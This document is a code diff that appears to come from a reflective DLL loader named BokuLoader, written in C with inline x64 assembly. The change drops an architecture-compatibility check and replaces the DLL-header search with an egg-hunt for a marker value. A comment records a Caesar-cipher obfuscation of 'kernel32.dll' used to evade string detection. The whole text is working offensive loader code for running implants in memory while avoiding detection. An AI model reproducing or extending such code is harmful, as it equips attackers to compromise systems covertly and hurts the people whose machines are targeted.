@@ -39,7 +39,6 @@ void *   getDllBase(char *);
 void *   getFirstEntry(void);
 void *   getNextEntry(void * currentEntry, void * firstEntry);
 void *   getDllBaseFromEntry(void * entry);
-unsigned short  getMachineType(void * NewExeHeader);
 void    Memcpy(void * destination, void * source, unsigned int num);
 void *   getExportDirectory(void * dllAddr);
 unsigned long   getExportDirectorySize(void * dllAddr);
@@ -105,11 +104,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     Dll ntdll;
     ntdll.dllBase = getDllBase((char *)s_ntdll);
     parseDLL(&ntdll);
-
-    // check that the rDLL is the same architecture as the host process
-    if(getMachineType(rdll_src.NewExeHeader) != getMachineType(ntdll.NewExeHeader)) {
-        return NULL;
-    }
 
     // Get Export Directory and Export Tables for Kernel32.dll
     // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
@@ -592,25 +586,19 @@ __asm__(
 "getRip: \n"
     "mov rax, [rsp] \n"             // get the return address
     "ret \n"
-"getMachineType: \n"
-    "add rcx, 0x4 \n"
-    "xor rax, rax \n"
-    "mov ax, [rcx] \n"
-    "ret \n"
+
 "getRdllBase: \n"
-    "mov rbx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
+    "xor rbx, rbx \n"
+    "mov ebx, 0xB0C0ACDC \n"        // egg
 "dec: \n"
     "dec rcx \n"
-    "cmp bx, word ptr ds:[rcx] \n"  // Compare the first 2 bytes of the page to "MZ"
+    "cmp ebx, [rcx] \n"             // check for egg
     "jne dec \n"
-    "xor rax, rax \n"
-    "mov ax, [rcx+0x3C] \n"         // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
-    "add rax, rcx \n"               // DLL base + RVA new exe header = 0x00004550 PE00 Signature
-    "xor rbx, rbx \n"
-    "add bx, 0x4550 \n"             // PEOO
-    "cmp bx, word ptr ds:[rax] \n " // Compare the 4 bytes to PE\0\0
+    "mov rax, rcx \n"               // copy the position pointer
+    "sub rax, 0x4 \n"               // check for second egg. If it's not there then its an error
+    "cmp ebx, [rax] \n"             // check for egg
     "jne getRdllBase \n"
-    "mov rax, rcx \n"               // Return the base address of our reflective DLL
+    "sub rax, 0x50 \n"              // Return the base address of our reflective DLL
     "ret \n"                        // return initRdllAddr
 
 
